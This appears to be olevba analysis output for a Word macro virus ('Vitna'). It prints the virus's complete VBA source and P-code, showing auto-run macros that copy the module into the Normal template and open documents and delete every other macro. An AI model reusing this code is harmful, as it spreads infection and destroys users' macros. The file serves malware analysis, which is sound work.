olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Vitna
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO NewDocument.cls 
in file: Virus.MSWord.Vitna - OLE stream: 'Macros/VBA/NewDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Antivir.bas 
in file: Virus.MSWord.Vitna - OLE stream: 'Macros/VBA/Antivir'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Const countlist = 2 '÷èñëî èçâåñòíûõ ìîäóëåé
Dim List
Const ShablonName As String = "NewDocument"
Sub AutoOpen()
  List = Array("Antivir", " ")
  DeleteMacrosNT
  DeleteMacrosAD
  Antivirus_infect
End Sub
Sub docClose()
  List = Array("Antivir", " ")
  DeleteMacrosNT
  DeleteMacrosAD
  Antivirus_infect
   If (Left(ActiveDocument.Name, 8) <> "Äîêóìåíò") Then
    ActiveDocument.Save
    End If
   ActiveDocument.Close
End Sub
Sub AutoNew()
  List = Array("Antivir", " ")
  DeleteMacrosNT
  DeleteMacrosAD
  Antivirus_infect
End Sub

Private Sub Antivirus_infect()
  Copyrights = "The Antivirus, 2002"
  NtInfected = False
  AdInfected = False
  Set NT = NormalTemplate.VBProject.VBComponents
  Set AD = ActiveDocument.VBProject.VBComponents
  If Documents.Count >= 1 Then
    For i = 1 To NT.Count
     If NT.Item(i).Name = "Antivir" Then NtInfected = True
   Next i
    For i = 1 To AD.Count
      If AD.Item(i).Name = "Antivir" Then AdInfected = True
   Next i
   If AdInfected And Not NtInfected Then
   'Infect normal
    Application.OrganizerCopy ActiveDocument.FullName, _
    NormalTemplate.FullName, "Antivir", _
    wdOrganizerObjectProjectItems
   End If
   If Not AdInfected And NtInfected Then
   'Infect Activdoc
   Application.OrganizerCopy NormalTemplate.FullName, _
    ActiveDocument.FullName, "Antivir", _
    wdOrganizerObjectProjectItems
   End If
  End If
End Sub

Private Sub DeleteMacrosNT()
Set NT = NormalTemplate.VBProject.VBComponents
'Dim list
 'list = Array("Antivirus", "_")
 'countlist = 2
i = 1
While i <= NT.Count
Set OMacros = NT.Item(i)
Novirus = False
 For j = 1 To countlist
  Novirus = Novirus Or (OMacros.Name = List(j - 1))
 Next j
 If Not Novirus Then 'deleted unknoun macros
  MCount = NT.Count
  If i > 1 Then NT.Remove (OMacros)
  If i = 1 Then  'ThisDocument
  l = NT.Item(1).codemodule.CountOfLines
   NT.Item(1).codemodule.DeleteLines 1, l
   OMacros.Name = ShablonName
   i = i + 1
  End If
 End If
 If Novirus Then i = i + 1
Wend
End Sub
Private Sub DeleteMacrosAD()
Set AD = ActiveDocument.VBProject.VBComponents
'Dim list
 'list = Array("Antivirus", "_")
 'countlist = 2
i = 1
While i <= AD.Count
Set OMacros = AD.Item(i)
Novirus = False
 For j = 1 To countlist
  Novirus = Novirus Or (OMacros.Name = List(j - 1))
 Next j
 If Not Novirus Then 'deleted unknoun macros
  MCount = AD.Count
  If i > 1 Then AD.Remove (OMacros)
  If i = 1 Then  'ThisDocument
  l = AD.Item(1).codemodule.CountOfLines
   AD.Item(1).codemodule.DeleteLines 1, l
   OMacros.Name = ShablonName
   i = i + 1
  End If
 End If
 If Novirus Then i = i + 1
Wend
End Sub
'Sub AutoClose()
 'MsgBox "Infected"
 'res = MsgBox("Ñäåëàòü ïðèâèâêó çàêðûâàåìîìó ôàéëó?", vbQuestion + vbYesNo, "Àíòàâèðóñíàÿ ïðèâèâêà")
 'If res = vdYes Then
 'Antivirus_infect
 'MsgBox "Ïðèâèëè óñïåøíî", vbInformation, "Àíòàâèðóñíàÿ ïðèâèâêà"
 'End If
'End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Vitna
' ===============================================================================
' Module streams:
' Macros/VBA/NewDocument - 899 bytes
' Macros/VBA/Antivir - 5891 bytes
' Line #0:
' 	Dim (Const) 
' 	LitDI2 0x0002 
' 	VarDefn countlist
' 	QuoteRem 0x0014 0x0017 "÷èñëî èçâåñòíûõ ìîäóëåé"
' Line #1:
' 	Dim 
' 	VarDefn List
' Line #2:
' 	Dim (Const) 
' 	LitStr 0x000B "NewDocument"
' 	VarDefn ShablonName (As String)
' Line #3:
' 	FuncDefn (Sub AutoOpen())
' Line #4:
' 	LitStr 0x0007 "Antivir"
' 	LitStr 0x0001 " "
' 	ArgsArray Array 0x0002 
' 	St List 
' Line #5:
' 	ArgsCall DeleteMacrosNT 0x0000 
' Line #6:
' 	ArgsCall DeleteMacrosAD 0x0000 
' Line #7:
' 	ArgsCall Antivirus_infect 0x0000 
' Line #8:
' 	EndSub 
' Line #9:
' 	FuncDefn (Sub docClose())
' Line #10:
' 	LitStr 0x0007 "Antivir"
' 	LitStr 0x0001 " "
' 	ArgsArray Array 0x0002 
' 	St List 
' Line #11:
' 	ArgsCall DeleteMacrosNT 0x0000 
' Line #12:
' 	ArgsCall DeleteMacrosAD 0x0000 
' Line #13:
' 	ArgsCall Antivirus_infect 0x0000 
' Line #14:
' 	Ld ActiveDocument 
' 	MemLd New 
' 	LitDI2 0x0008 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0008 "Äîêóìåíò"
' 	Ne 
' 	Paren 
' 	IfBlock 
' Line #15:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #16:
' 	EndIfBlock 
' Line #17:
' 	Ld ActiveDocument 
' 	ArgsMemCall Close 0x0000 
' Line #18:
' 	EndSub 
' Line #19:
' 	FuncDefn (Sub AutoNew())
' Line #20:
' 	LitStr 0x0007 "Antivir"
' 	LitStr 0x0001 " "
' 	ArgsArray Array 0x0002 
' 	St List 
' Line #21:
' 	ArgsCall DeleteMacrosNT 0x0000 
' Line #22:
' 	ArgsCall DeleteMacrosAD 0x0000 
' Line #23:
' 	ArgsCall Antivirus_infect 0x0000 
' Line #24:
' 	EndSub 
' Line #25:
' Line #26:
' 	FuncDefn (Private Sub Antivirus_infect())
' Line #27:
' 	LitStr 0x0013 "The Antivirus, 2002"
' 	St Copyrights 
' Line #28:
' 	LitVarSpecial (False)
' 	St NtInfected 
' Line #29:
' 	LitVarSpecial (False)
' 	St AdInfected 
' Line #30:
' 	SetStmt 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	Set NT 
' Line #31:
' 	SetStmt 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	Set AD 
' Line #32:
' 	Ld Documents 
' 	MemLd Count 
' 	LitDI2 0x0001 
' 	Ge 
' 	IfBlock 
' Line #33:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld NT 
' 	MemLd Count 
' 	For 
' Line #34:
' 	Ld i 
' 	Ld NT 
' 	ArgsMemLd Item 0x0001 
' 	MemLd New 
' 	LitStr 0x0007 "Antivir"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St NtInfected 
' 	EndIf 
' Line #35:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #36:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld AD 
' 	MemLd Count 
' 	For 
' Line #37:
' 	Ld i 
' 	Ld AD 
' 	ArgsMemLd Item 0x0001 
' 	MemLd New 
' 	LitStr 0x0007 "Antivir"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St AdInfected 
' 	EndIf 
' Line #38:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #39:
' 	Ld AdInfected 
' 	Ld NtInfected 
' 	Not 
' 	And 
' 	IfBlock 
' Line #40:
' 	QuoteRem 0x0003 0x000D "Infect normal"
' Line #41:
' 	LineCont 0x0008 07 00 04 00 0D 00 04 00
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	LitStr 0x0007 "Antivir"
' 	Ld wdOrganizerObjectProjectItems 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #42:
' 	EndIfBlock 
' Line #43:
' 	Ld AdInfected 
' 	Not 
' 	Ld NtInfected 
' 	And 
' 	IfBlock 
' Line #44:
' 	QuoteRem 0x0003 0x000F "Infect Activdoc"
' Line #45:
' 	LineCont 0x0008 07 00 04 00 0D 00 04 00
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	LitStr 0x0007 "Antivir"
' 	Ld wdOrganizerObjectProjectItems 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #46:
' 	EndIfBlock 
' Line #47:
' 	EndIfBlock 
' Line #48:
' 	EndSub 
' Line #49:
' Line #50:
' 	FuncDefn (Private Sub DeleteMacrosNT())
' Line #51:
' 	SetStmt 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	Set NT 
' Line #52:
' 	QuoteRem 0x0000 0x0008 "Dim list"
' Line #53:
' 	QuoteRem 0x0001 0x001E "list = Array("Antivirus", "_")"
' Line #54:
' 	QuoteRem 0x0001 0x000D "countlist = 2"
' Line #55:
' 	LitDI2 0x0001 
' 	St i 
' Line #56:
' 	Ld i 
' 	Ld NT 
' 	MemLd Count 
' 	Le 
' 	While 
' Line #57:
' 	SetStmt 
' 	Ld i 
' 	Ld NT 
' 	ArgsMemLd Item 0x0001 
' 	Set OMacros 
' Line #58:
' 	LitVarSpecial (False)
' 	St Novirus 
' Line #59:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld countlist 
' 	For 
' Line #60:
' 	Ld Novirus 
' 	Ld OMacros 
' 	MemLd New 
' 	Ld j 
' 	LitDI2 0x0001 
' 	Sub 
' 	ArgsLd List 0x0001 
' 	Eq 
' 	Paren 
' 	Or 
' 	St Novirus 
' Line #61:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	NextVar 
' Line #62:
' 	Ld Novirus 
' 	Not 
' 	IfBlock 
' 	QuoteRem 0x0015 0x0016 "deleted unknoun macros"
' Line #63:
' 	Ld NT 
' 	MemLd Count 
' 	St MCount 
' Line #64:
' 	Ld i 
' 	LitDI2 0x0001 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	Ld OMacros 
' 	Paren 
' 	Ld NT 
' 	ArgsMemCall Remove 0x0001 
' 	EndIf 
' Line #65:
' 	Ld i 
' 	LitDI2 0x0001 
' 	Eq 
' 	IfBlock 
' 	QuoteRem 0x0011 0x000C "ThisDocument"
' Line #66:
' 	LitDI2 0x0001 
' 	Ld NT 
' 	ArgsMemLd Item 0x0001 
' 	MemLd codemodule 
' 	MemLd CountOfLines 
' 	St l 
' Line #67:
' 	LitDI2 0x0001 
' 	Ld l 
' 	LitDI2 0x0001 
' 	Ld NT 
' 	ArgsMemLd Item 0x0001 
' 	MemLd codemodule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #68:
' 	Ld ShablonName 
' 	Ld OMacros 
' 	MemSt New 
' Line #69:
' 	Ld i 
' 	LitDI2 0x0001 
' 	Add 
' 	St i 
' Line #70:
' 	EndIfBlock 
' Line #71:
' 	EndIfBlock 
' Line #72:
' 	Ld Novirus 
' 	If 
' 	BoSImplicit 
' 	Ld i 
' 	LitDI2 0x0001 
' 	Add 
' 	St i 
' 	EndIf 
' Line #73:
' 	Wend 
' Line #74:
' 	EndSub 
' Line #75:
' 	FuncDefn (Private Sub DeleteMacrosAD())
' Line #76:
' 	SetStmt 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	Set AD 
' Line #77:
' 	QuoteRem 0x0000 0x0008 "Dim list"
' Line #78:
' 	QuoteRem 0x0001 0x001E "list = Array("Antivirus", "_")"
' Line #79:
' 	QuoteRem 0x0001 0x000D "countlist = 2"
' Line #80:
' 	LitDI2 0x0001 
' 	St i 
' Line #81:
' 	Ld i 
' 	Ld AD 
' 	MemLd Count 
' 	Le 
' 	While 
' Line #82:
' 	SetStmt 
' 	Ld i 
' 	Ld AD 
' 	ArgsMemLd Item 0x0001 
' 	Set OMacros 
' Line #83:
' 	LitVarSpecial (False)
' 	St Novirus 
' Line #84:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld countlist 
' 	For 
' Line #85:
' 	Ld Novirus 
' 	Ld OMacros 
' 	MemLd New 
' 	Ld j 
' 	LitDI2 0x0001 
' 	Sub 
' 	ArgsLd List 0x0001 
' 	Eq 
' 	Paren 
' 	Or 
' 	St Novirus 
' Line #86:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	NextVar 
' Line #87:
' 	Ld Novirus 
' 	Not 
' 	IfBlock 
' 	QuoteRem 0x0015 0x0016 "deleted unknoun macros"
' Line #88:
' 	Ld AD 
' 	MemLd Count 
' 	St MCount 
' Line #89:
' 	Ld i 
' 	LitDI2 0x0001 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	Ld OMacros 
' 	Paren 
' 	Ld AD 
' 	ArgsMemCall Remove 0x0001 
' 	EndIf 
' Line #90:
' 	Ld i 
' 	LitDI2 0x0001 
' 	Eq 
' 	IfBlock 
' 	QuoteRem 0x0011 0x000C "ThisDocument"
' Line #91:
' 	LitDI2 0x0001 
' 	Ld AD 
' 	ArgsMemLd Item 0x0001 
' 	MemLd codemodule 
' 	MemLd CountOfLines 
' 	St l 
' Line #92:
' 	LitDI2 0x0001 
' 	Ld l 
' 	LitDI2 0x0001 
' 	Ld AD 
' 	ArgsMemLd Item 0x0001 
' 	MemLd codemodule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #93:
' 	Ld ShablonName 
' 	Ld OMacros 
' 	MemSt New 
' Line #94:
' 	Ld i 
' 	LitDI2 0x0001 
' 	Add 
' 	St i 
' Line #95:
' 	EndIfBlock 
' Line #96:
' 	EndIfBlock 
' Line #97:
' 	Ld Novirus 
' 	If 
' 	BoSImplicit 
' 	Ld i 
' 	LitDI2 0x0001 
' 	Add 
' 	St i 
' 	EndIf 
' Line #98:
' 	Wend 
' Line #99:
' 	EndSub 
' Line #100:
' 	QuoteRem 0x0000 0x000F "Sub AutoClose()"
' Line #101:
' 	QuoteRem 0x0001 0x0011 "MsgBox "Infected""
' Line #102:
' 	QuoteRem 0x0001 0x0063 "res = MsgBox("Ñäåëàòü ïðèâèâêó çàêðûâàåìîìó ôàéëó?", vbQuestion + vbYesNo, "Àíòàâèðóñíàÿ ïðèâèâêà")"
' Line #103:
' 	QuoteRem 0x0001 0x0013 "If res = vdYes Then"
' Line #104:
' 	QuoteRem 0x0001 0x0010 "Antivirus_infect"
' Line #105:
' 	QuoteRem 0x0001 0x0040 "MsgBox "Ïðèâèëè óñïåøíî", vbInformation, "Àíòàâèðóñíàÿ ïðèâèâêà""
' Line #106:
' 	QuoteRem 0x0001 0x0006 "End If"
' Line #107:
' 	QuoteRem 0x0000 0x0007 "End Sub"
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |AutoNew             |Runs when a new Word document is created     |
|AutoExec  |NewDocument         |Runs when a new Word document is created     |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

